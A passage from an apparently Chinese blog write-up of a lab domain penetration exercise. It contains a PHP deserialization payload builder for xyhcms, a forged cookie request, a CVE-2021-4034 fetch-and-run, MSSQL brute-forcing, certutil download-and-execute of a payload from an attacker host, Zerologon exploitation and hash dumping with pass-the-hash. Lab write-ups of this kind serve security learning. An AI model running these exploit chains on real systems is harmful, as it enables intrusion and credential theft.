class="variable">$i</span> = <span class="number">0</span>;<span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$txt</span>); <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$md5</span> = <span class="variable">$txt</span>[<span class="variable">$i</span>];</span><br><span class="line">            <span class="variable">$tmp</span> .= <span class="variable">$txt</span>[++<span class="variable">$i</span>] ^ <span class="variable">$md5</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$tmp</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">__key</span>(<span class="params"><span class="variable">$txt</span>,<span class="variable">$encrypt_key</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$encrypt_key</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$encrypt_key</span>);</span><br><span class="line">        <span class="variable">$ctr</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$tmp</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$txt</span>); <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$ctr</span> = <span class="variable">$ctr</span> == <span class="title function_ invoke__">strlen</span>(<span class="variable">$encrypt_key</span>) ? <span class="number">0</span> : <span class="variable">$ctr</span>;</span><br><span class="line">            <span class="variable">$tmp</span> .= <span class="variable">$txt</span>[<span class="variable">$i</span>] ^ <span class="variable">$encrypt_key</span>[<span class="variable">$ctr</span>++];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$tmp</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span> -&gt; crypt_key = <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_cookie</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$key</span> = <span class="string">&#x27;&#x27;</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$key</span> = <span class="string">&#x27;P4tzizR6d&#x27;</span>;</span><br><span class="line">    <span class="variable">$key</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$key</span>);</span><br><span class="line">    <span class="variable">$sc</span> = <span class="keyword">new</span> <span class="title class_">\Common\Lib\SysCrypt</span>(<span class="variable">$key</span>);</span><br><span class="line">    <span class="variable">$value</span> = <span class="variable">$sc</span>-&gt;<span class="title function_ invoke__">php_decrypt</span>(<span class="variable">$name</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">unserialize</span>(<span class="variable">$value</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">set_cookie</span>(<span class="params"><span class="variable">$args</span>, <span class="variable">$key</span> = <span class="string">&#x27;&#x27;</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$key</span> = <span class="string">&#x27;P4tzizR6d&#x27;</span>;</span><br><span class="line">    <span class="variable">$value</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$args</span>);</span><br><span class="line">    <span class="variable">$key</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$key</span>);</span><br><span class="line">    <span class="variable">$sc</span> = <span class="keyword">new</span> <span class="title class_">\Common\Lib\SysCrypt</span>(<span class="variable">$key</span>);</span><br><span class="line">    <span class="variable">$value</span> = <span class="variable">$sc</span>-&gt;<span class="title function_ invoke__">php_encrypt</span>(<span class="variable">$value</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$value</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title class_">\Think\Image\Driver\Imagick</span>();</span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">set_cookie</span>(<span class="variable">$b</span>,<span class="string">&#x27;&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;+&#x27;</span>,<span class="string">&#x27;%2B&#x27;</span>,<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure>
+
+<p>执行获取加密序列化代码：</p>
+<p><img src="/2023/10/23/scanner/image-20240129001517756.png" alt="image-20240129001517756"></p>
+<p>替换Cookie中nickname的值：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">GET /index.php?s=/Home/Member/index.html HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">192.168</span>.<span class="number">0.208</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Macintosh; Intel Mac OS X <span class="number">10.15</span>; rv:<span class="number">121.0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">121.0</span></span><br><span class="line">Accept: *<span class="comment">/*</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment">Cookie: PHPSESSID=t55un30c9af445pl69bpk06gg4; JSESSIONID=A9D5E06329DEA6F59039350B1BEEBE6C; _jspxcms=cf6f7fa5f251497db022ab670d6bbcf2; _site=1; uid=WXoCP1w2AzkCIgIzWHsLMA%3D%3D; email=V3RTblw2V2VRaVNyCGhcOFc7AWFXOVNBBHMBdlQvAmUCPQNpWSAGPQ%3D%3D; phone=VnUAPV03U2IDO1R1X28NOFBgDzdWZFIzCzlRYlEyAjFXPwEkAGA%3D; nickname=VklUaQlgATcIMAUkC15cNAJqXjlTOAMNVxgEbwczUTJQZQBbDhEDcVY9UicPa1ooAF1cHFwxUWJWNwplBDIHaFYkVGkJYwE7CHEFdQswXG8CMl5tU3EDUVcFBGoHO1E7UGsAWw4cA25WNVI2D2taBgBFXCdcNVF1VjUKfgQNB0pWa1QyCTUBaAhpBW0LClw1Am5eMFNxA2pXHgQ4B2BRbFA6ACUOAQNrVj1SPw9lWgYAUlwwXC9RcFY5CmMEPwdfVkJUIQk7AXcIbwV0C1ZcEQJmXjpTMAMwVzIEagc3UXdQOgA2Dm8DeFYnUmsPN1pgACNcVVx2UQNWOAptBD8HZ1ZqVDYJcAE6CEUFPAs7XG0COV51UwcDOVc4BGwHOVEJUE0AaA4xA2ZWOFJzDzRabgA7XC5cL1E5VmEKPARrByFWBlR5CVIBbgh6BXILY1wzAm1eJFNxA2pXMAQ4B2NRb1B7AHQObwM2Vm5Scw95WjIAZFwnXDlRIVZrCn8EawczVjxUcQlwAToIdwV1CzBcaQI5XnVTUwN7V1EEcgc5UXdQOwB0Dm8DNlZuUnMPYlovAG5cPlw5USFWawp/BGsHNFY8VHEJUgErCAoFYgtrXCgCYl51U2gDMFdrBDMHaFEuUHMAPQ5gAzlWdlI9D3taNQBqXDBcflE4VjEKNgRjBzlWfVQgCWgBNAgwBSQLflw9AmFeO1M2A3NXagRxB2hRZFAzAD0OdwN7Vi1SOQ9RWjsAZVw4XDVRbVYPCmAEPgdkViRUaAkhATsIPwU8CyhcKwJrXjJTIQM0V3MEOQchUW9QMQA3Dm0DOVZ2UjgPalpnADFcblx8UWJWPAp4BDQHcVYmVCcJMwFjCGYFYwsqXCQCel4/UwwDNlckBGcHIVEhUGIAaA46A2hWdFIwD2paPgAhXDZcM1FvViUKYQQ/ByNWZlRvCSEBYgh4BW8LelwoAiNeO1MyAz9XNgR3BzNRMlBlADoOcgNzVjxSIQ8pWmQAZFwjXD1Rb1Z4CigEDgdTVklUAAkGAVoIaQVrC25cAQIqXmxTbwN%2BVyIEYQcgUTxQcABzDmsDY1Z0UicPb1ooAGJcPVw9UXFWeAo9BGEHKlY9VHEJaQF8CHcFdQswXGkCOV51U1MDe1dRBGYHMFF3UDsASA5vAzFWZVJrDyxaDgBpXDxcMlFoVgwKSAQzB19WQlQhCTsBdwhvBXQLVlwRAnpeJFMiAz1XcwQ4B2BRb1B7AHQObwMyVmRSaw8sWloAK1xVXDNRc1YkCmUEPgdtVnVUcQlpAWAIMAU3CzBcJwJqXm1TYgNhV2EEMwdpUTdQOgA2Dm4DflYnUmsPN1pgACNcVVx2UQNWMwpjBD8HZVZvVDQJcAE6CGsFPAs5XGYCeF4kU2kDYldrBCAHNlEmUG4AJQ5uA3BWblJkDz9aYAAjXDhcJVFwViEKYARrB2tWaVQgCSYBPAg7BTQLPVxyAjNeeVNjA39XYAQ5BzZRN1BuAGYOOANmVmlSJg95Wi0AXlwtXCVRYFY9Cn8EDgdgVmlUPglpAXEIZQV0C35cYQIwXmRTYwNnV3MEOQchUW9QOAA9DncDdlYnUjQPfFo0AGBcOFw5USFWawp/BGsHN1Y8VHEJIAFuCGUFcgsoXGcCcF5tU2sDa1dzBHIHM1EmUHMAcA46A3FWMFJzDzVaKQA7XGRcalE5VnIKNQQwBzpWMVRgCTQBZQg9BT8LOFxkAmFeNVNgAzJXYwQgB2lRKFB9AHoOKAN%2B  ; login_time=BCcINQhiUmsEPFV0X28BOFZnDzZUeQVnUGcEL1E0UmdRIVdgWTJWbAc1CTpcZwExADFddgA7; login_ip=ACMAPQFqUGoAIAEgCDI%3D; status=BSYAPQpgAzkDI1NgDC9bYA%3D%3D; verifytime=WWBQbQ9lV2BRY1RhCz4OPQI3WmUFMgNmUWw%3D; uf=AyAFOAplXWwIMAQlW2gLJQVhXTZWb1M1UWcEOwJvAjFVNVUxXTYDOgYwA2ZcZQw%2FUDIMPVNnXjoKbQc5B2ZYOgM2BTIKaF1tCD0EZltiC2kFKl1kVmZTM1FvBDYCYgIkVT4%3D</span></span><br></pre></td></tr></table></figure>
+
+<p>发送后后台清理缓存，访问留言本：</p>
+<p><img src="/2023/10/23/scanner/image-20240129001529720.png" alt="image-20240129001529720"></p>
+<p><img src="/2023/10/23/scanner/image-20240129001539147.png" alt="image-20240129001539147"></p>
+<p><img src="/2023/10/23/scanner/image-20240129001605289.png" alt="image-20240129001605289"></p>
+<h3 id="宝塔disfunction绕过"><a href="#宝塔disfunction绕过" class="headerlink" title="宝塔disfunction绕过"></a>宝塔disfunction绕过</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/tmp/php-cgi-56.sock</span><br><span class="line">/www/wwwroot/www.xycms.com/App/Runtime/Data/3277c100b8afcccfb950d28a6ff7113c__fields</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/10/23/scanner/image-20240129001633051.png" alt="image-20240129001633051"></p>
+<p><img src="/2023/10/23/scanner/image-20240129001651926.png" alt="image-20240129001651926"></p>
+<h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><h3 id="CVE-2021-4034"><a href="#CVE-2021-4034" class="headerlink" title="CVE-2021-4034"></a>CVE-2021-4034</h3><p>上传linpeas执行查看可提权的信息：</p>
+<p><img src="/2023/10/23/scanner/image-20240129001659120.png" alt="image-20240129001659120"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget 192.168.0.12/CVE-2021-3493.c</span><br><span class="line">gcc cve-2021-4034-poc.c </span><br><span class="line">./a.out</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/10/23/scanner/image-20240129001705090.png" alt="image-20240129001705090"></p>
+<h2 id="Flag1"><a href="#Flag1" class="headerlink" title="Flag1"></a>Flag1</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /root/root.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/10/23/scanner/image-20240129001711662.png" alt="image-20240129001711662"></p>
+<h1 id="数据库服务器"><a href="#数据库服务器" class="headerlink" title="数据库服务器"></a>数据库服务器</h1><h2 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">../fscan -h 192.168.188.145 -np -p 1-65535 -socks5 127.0.0.1:1090</span><br><span class="line"></span><br><span class="line">   ___                              _  </span><br><span class="line">  / _ \     ___  ___ _ __ __ _  ___| | __ </span><br><span class="line"> / /_\/____/ __|/ __| <span class="string">&#x27;__/ _` |/ __| |/ /</span></span><br><span class="line"><span class="string">/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;  </span></span><br><span class="line"><span class="string">\____/     |___/\___|_|  \__,_|\___|_|\_\   </span></span><br><span class="line"><span class="string">                     fscan version: 1.8.0</span></span><br><span class="line"><span class="string">Socks5Proxy: socks5://127.0.0.1:1090</span></span><br><span class="line"><span class="string">start infoscan</span></span><br><span class="line"><span class="string">192.168.188.145:135 open</span></span><br><span class="line"><span class="string">192.168.188.145:139 open</span></span><br><span class="line"><span class="string">192.168.188.145:445 open</span></span><br><span class="line"><span class="string">192.168.188.145:1433 open</span></span><br><span class="line"><span class="string">192.168.188.145:2383 open</span></span><br><span class="line"><span class="string">192.168.188.145:5985 open</span></span><br><span class="line"><span class="string">192.168.188.145:47001 open</span></span><br><span class="line"><span class="string">192.168.188.145:49152 open</span></span><br><span class="line"><span class="string">192.168.188.145:49153 open</span></span><br><span class="line"><span class="string">192.168.188.145:49154 open</span></span><br><span class="line"><span class="string">192.168.188.145:49155 open</span></span><br><span class="line"><span class="string">192.168.188.145:49157 open</span></span><br><span class="line"><span class="string">192.168.188.145:49156 open</span></span><br><span class="line"><span class="string">192.168.188.145:49159 open</span></span><br><span class="line"><span class="string">192.168.188.145:49158 open</span></span><br><span class="line"><span class="string">[*] alive ports len is: 15</span></span><br><span class="line"><span class="string">start vulscan</span></span><br><span class="line"><span class="string">[*] NetInfo </span></span><br><span class="line"><span class="string">[*]192.168.188.145</span></span><br><span class="line"><span class="string">   [-&gt;]db</span></span><br><span class="line"><span class="string">   [-&gt;]10.10.12.136</span></span><br><span class="line"><span class="string">   [-&gt;]192.168.188.145</span></span><br><span class="line"><span class="string">[*] WebTitle http://192.168.188.145:5985 code:404 len:315    title:Not Found</span></span><br><span class="line"><span class="string">[*] WebTitle http://192.168.188.145:47001 code:404 len:315    title:Not Found</span></span><br><span class="line"><span class="string">已完成 15/15</span></span><br><span class="line"><span class="string">[*] 扫描结束,耗时: 59.138448334s                              </span></span><br></pre></td></tr></table></figure>
+
+<h2 id="MSSql数据库爆破"><a href="#MSSql数据库爆破" class="headerlink" title="MSSql数据库爆破"></a>MSSql数据库爆破</h2><p>尝试爆破<code>mssql</code>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo proxychains hydra -l sa -P rockyou.txt mssql://192.168.188.145:1433/</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/10/23/scanner/image-20240129001741180.png" alt="image-20240129001741180"></p>
+<p>使用MDUT连接激活XpCmdshell：</p>
+<p><img src="/2023/10/23/scanner/image-20240129001748958.png" alt="image-20240129001748958"></p>
+<p>远程下载执行：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">certutil -urlcache -<span class="built_in">split</span> -f http://192.168.0.12/a.exe C:/ProgramData/a.exe </span><br><span class="line"><span class="built_in">dir</span>  <span class="string">&quot;C:/ProgramData&quot;</span></span><br><span class="line">C:/ProgramData/a.exe</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/10/23/scanner/image-20240129001755470.png" alt="image-20240129001755470"></p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p><code>SpoolSystem 注入</code>提权：</p>
+<p><img src="/2023/10/23/scanner/image-20240129001810415.png" alt="image-20240129001810415"></p>
+<h2 id="Flag2"><a href="#Flag2" class="headerlink" title="Flag2"></a>Flag2</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell <span class="built_in">type</span> C:\Users\Administrator\root.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/10/23/scanner/image-20240129001817067.png" alt="image-20240129001817067"></p>
+<h1 id="域控"><a href="#域控" class="headerlink" title="域控"></a>域控</h1><h2 id="信息收集-2"><a href="#信息收集-2" class="headerlink" title="信息收集"></a>信息收集</h2><p>抓取明文:</p>
+<p><img src="/2023/10/23/scanner/image-20240129001837747.png" alt="image-20240129001837747"></p>
+<p>注入域用户进程，信息收集，定位域控：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">shell net user /domain</span><br><span class="line">shell net time /domain</span><br><span class="line">shell ping ad.scaner.sec -n 1</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/10/23/scanner/image-20240129001845837.png" alt="image-20240129001845837"></p>
+<p><img src="/2023/10/23/scanner/image-20240129001852282.png" alt="image-20240129001852282"></p>
+<p><img src="/2023/10/23/scanner/image-20240129001859702.png" alt="image-20240129001859702"></p>
+<h2 id="CVE-2020-1472"><a href="#CVE-2020-1472" class="headerlink" title="CVE-2020-1472"></a>CVE-2020-1472</h2><h3 id="获取DC主机名"><a href="#获取DC主机名" class="headerlink" title="获取DC主机名"></a>获取DC主机名</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell <span class="built_in">net</span> <span class="built_in">time</span> /domain</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/10/23/scanner/image-20240129001907460.png" alt="image-20240129001907460"></p>
+<h3 id="2、连接DC清空凭据"><a href="#2、连接DC清空凭据" class="headerlink" title="2、连接DC清空凭据"></a>2、连接DC清空凭据</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python ../cve-<span class="number">2020</span>-<span class="number">1472</span>/cve-<span class="number">2020</span>-<span class="number">1472</span>-exploit.py ad <span class="number">10</span>.<span class="number">10</span>.<span class="number">12</span>.<span class="number">135</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/10/23/scanner/image-20240129001914761.png" alt="image-20240129001914761"></p>
+<h3 id="3、获取域内Hash"><a href="#3、获取域内Hash" class="headerlink" title="3、获取域内Hash"></a>3、获取域内Hash</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 ../impacket-<span class="number">0</span>.<span class="number">10</span>.<span class="number">0</span>/examples/secretsdump.py ad\$@<span class="number">10</span>.<span class="number">10</span>.<span class="number">12</span>.<span class="number">135</span> -just-dc -no-pass</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/10/23/scanner/image-20240129001922445.png" alt="image-20240129001922445"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:35dc382e7d31f6823c2e34216d4c15cb:::</span><br></pre></td></tr></table></figure>
+
+<h3 id="4、通过Hash连接域控"><a href="#4、通过Hash连接域控" class="headerlink" title="4、通过Hash连接域控"></a>4、通过Hash连接域控</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 ../impacket-<span class="number">0</span>.<span class="number">10</span>.<span class="number">0</span>/examples/psexec.py -hashes :<span class="number">35</span>dc382e7d31f6823c2e34216d4c15cb scanner.sec/administrator@<span class="number">10</span>.<span class="number">10</span>.<span class="number">12</span>.<span class="number">135</span> -c ./sec.exe</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/10/23/scanner/image-20240129001929693.png" alt="image-20240129001929693"></p>
+<p>DB服务器创建转发上线监听器，PSEXE执行CS上线：</p>
+<p><img src="/2023/10/23/scanner/image-20240129001935899.png" alt="image-20240129001935899"></p>
+<p><img src="/2023/10/23/scanner/image-20240129001942489.png" alt="image-20240129001942489"></p>
+<h3 id="5、恢复密码"><a href="#5、恢复密码" class="headerlink" title="5、恢复密码"></a>5、恢复密码</h3><p>CS计算机账号原始Hash并保存为以下文件：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">shell reg save HKLM\SYSTEM system.save</span><br><span class="line">shell reg save HKLM\SAM sam.save</span><br><span class="line">shell reg save HKLM\SECURITY security.save</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/10/23/scanner/image-20240129001951996.png" alt="image-20240129001951996"></p>
+<p>使用这些文件获取机器账户原来的Hash值：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python ../impacket-0.10.0/examples/secretsdump.py -sam sam.save -system system.save -security security.save LOCAL</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/10/23/scanner/image-20240129002009098.png" alt="image-20240129002009098"></p>
+<p>拿到<code>$MACHINE.ACC</code>的第二段：<code>0c0b79646c00195516a48454c0c64e57</code>。</p>
+<p>使用<a class="link" target="_blank" rel="noopener" href="https://github.com/risksense/zerologon">zerologon<i class="fas fa-external-link-alt"></i></a>工具还原机器账户哈希。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python ../zerologon-master/reinstall_original_pw.py ad 10.10.12.135 0c0b79646c00195516a48454c0c64e57</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/10/23/scanner/image-20240129002015309.png" alt="image-20240129002015309"></p>
+<p>验证空密码是否恢复：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 ../impacket-0.10.0/examples/secretsdump.py ad\<span class="variable">$@10</span>.10.12.135 -just-dc -no-pass</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/10/23/scanner/image-20240129002027946.png" alt="image-20240129002027946"></p>
+<p>验证机器账户Hash是否正常：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 ../impacket-0.10.0/examples/secretsdump.py ad\<span class="variable">$@10</span>.10.12.135 -just-dc -hashes :0c0b79646c00195516a48454c0c64e57</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/10/23/scanner/image-20240129002036342.png" alt="image-20240129002036342"></p>
+<h2 id="Flag3"><a href="#Flag3" class="headerlink" title="Flag3"></a>Flag3</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell <span class="built_in">type</span> C:\Users\Administrator\root.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/10/23/scanner/image-20240129002048311.png" alt="image-20240129002048311"></p>
+
+        </div>
+
+        
+
+        
+            <ul class="post-tags-box">
+                
+                    <li class="tag-item">
+                        <a href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93GetShell/">#数据库GetShell</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/CVE-2020-1472/">#CVE-2020-1472</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/xyhcms%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">#xyhcms反序列化</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/%E5%AE%9D%E5%A1%94disfunction%E7%BB%95%E8%BF%87/">#宝塔disfunction绕过</a>&nbsp;
+                    </li>
+                
+            </ul>
+        
+
+        
+            <div class="article-nav">
+                
+                
+                    <div class="article-next">
+                        <a class="next"
+                           rel="next"
+                           href="/2023/10/17/sec123/"
+                        >
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">外网打点到内网域靶场-sec123</span>
+                                <span class="post-nav-item">下一篇</span>
+                            </span>
+                            <span class="right arrow-icon flex-center">
+                              <i class="fas fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+        
+    </div>
+</div>
+
+
+                
+            </div>
+
+        </div>
+
+        <div class="page-main-content-bottom">
+            <footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info info-item">
+            &copy;
+            
+              <span>2020</span>
+              -
+            
+            2024&nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;<a href="/">forg12</a>
+        </div>
+        
+            <script async  src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="website-count info-item">
+                
+                    <span id="busuanzi_container_site_uv">
+                        访问人数&nbsp;<span id="busuanzi_value_site_uv"></span>&ensp;
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv">
+                        总访问量&nbsp;<span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="theme-info info-item">
+            由 <a target="_blank" href="https://hexo.io">Hexo</a> 驱动&nbsp;|&nbsp;主题&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v6.6.6</a>
+        </div>
+        
+        
+    </div>
+</footer>
+
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="tools-item page-aside-toggle">
+                <i class="fas fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-bottom-side-tools">
+        <div class="side-tools-container">
+    <ul class="side-tools-list">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <li class="tools-item tool-expand-width flex-center">
+            <i class="fas fa-arrows-alt-h"></i>
+        </li>
+
+        <li class="tools-item tool-dark-light-toggle flex-center">
+            <i class="fas fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+            <li class="tools-item tool-scroll-to-top flex-center">
+                <i class="fas fa-arrow-up"></i>
+            </li>
+        
+
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list">
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+        
+    </ul>
+</div>
+
+    </div>
+
+    
+        <aside class="page-aside">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%9D%B6%E5%9C%BA%E6%8F%8F%E8%BF%B0"><span class="nav-number">1.</span> <span class="nav-text">靶场描述</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%9D%B6%E5%9C%BA%E6%8B%93%E6%89%91%E5%9B%BE"><span class="nav-number">1.1.</span> <span class="nav-text">靶场拓扑图</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#VSP%E8%AE%BE%E7%BD%AE"><span class="nav-number">1.2.</span> <span class="nav-text">VSP设置</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#WEB%E6%9C%8D%E5%8A%A1%E5%99%A8"><span class="nav-number">2.</span> <span class="nav-text">WEB服务器</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">2.1.</span> <span class="nav-text">信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="nav-number">2.1.1.</span> <span class="nav-text">端口扫描</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86"><span class="nav-number">2.1.2.</span> <span class="nav-text">目录遍历</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" 